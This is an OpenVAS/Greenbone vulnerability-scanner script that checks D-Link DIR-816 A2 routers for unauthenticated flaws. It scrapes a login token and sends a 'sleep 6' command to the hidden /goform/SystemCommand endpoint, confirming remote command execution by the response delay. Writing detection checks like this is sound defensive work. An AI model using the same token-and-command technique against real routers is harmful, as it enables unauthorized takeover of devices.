# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113452");
  script_version("2019-08-02T10:31:17+0000");
  script_tag(name:"last_modification", value:"2019-08-02 10:31:17 +0000 (Fri, 02 Aug 2019)");
  script_tag(name:"creation_date", value:"2019-08-01 12:02:22 +0200 (Thu, 01 Aug 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_cve_id("CVE-2019-11039", "CVE-2019-10040", "CVE-2019-10041", "CVE-2019-10042");

  script_name("D-Link DIR-816 A2 <= 1.11 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dlink_dir_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("d-link/dir/model");

  script_tag(name:"summary", value:"D-Link DIR-816 devices are prone to multiple vulnerabilities.");
  script_tag(name:"vuldetect", value:"Tries to execute a command on the device.");
  script_tag(name:"insight", value:"Following vulnerabilities exist:

  - An attacker can get a token from dir_login.asp and use an API URL /goform/setSysAdm
    to edit the web or system account without authentication.

  - An attacker can get a token from dir_login.asp and use a hidden API URL /goform/SystemCommand
    to execute a system command without authentication.

  - An attacker can get a token from dir_login.asp and use a hidden API URL /goform/form2userconfig.cgi
    to edit the system account without authentication.

  - An attacker can get a token form dir_login.asp and use a hidden API URL /goform/LoadDefaultSettings
    to reset the router without authentication.");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to gain
  complete control over the target device.");
  script_tag(name:"affected", value:"D-Link DIR-816 A2 through firmware version 1.11.");
  script_tag(name:"solution", value:"No known solution is available as of 02nd August, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/remote_cmd_exec_0/README.md");
  script_xref(name:"URL", value:"https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/edit_sys_account/README.md");
  script_xref(name:"URL", value:"https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/reset_router/README.md");

  exit(0);
}

CPE = "cpe:/h:d-link:dir-816";

include( "host_details.inc" );
include( "misc_func.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );

vuln_url = "/goform/SystemCommand";

start = unixtime();
res = http_get_cache( port: port, item: vuln_url );
stop = unixtime();

# if the base request is too long, the results will be too inaccurate
time = stop - start;
if( time > 3 ) exit( 0 );

buf = http_get_cache( item: "/dir_login.asp", port: port );
tk = eregmatch( string: buf, pattern: 'name=["\']tokenid["\'] *value=["\']([0-9a-z]+)["\']' );
if( ! token = tk[1] ) exit( 0 );

add_headers = make_array( 'Content-Type', 'application/x-www-form-urlencoded' );
data = 'command=sleep 6&tokenid=' + token;
req = http_post_req( port: port, url: vuln_url, add_headers: add_headers, data: data, host_header_use_ip: TRUE );

start = unixtime();
res = http_keepalive_send_recv( data: req, port: port );
stop = unixtime();

time = stop - start;
if( time >= 6 ) {
  report = 'It was possible to execute commands on the target system\n';
  report += report_vuln_url( port: port, url: vuln_url );
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
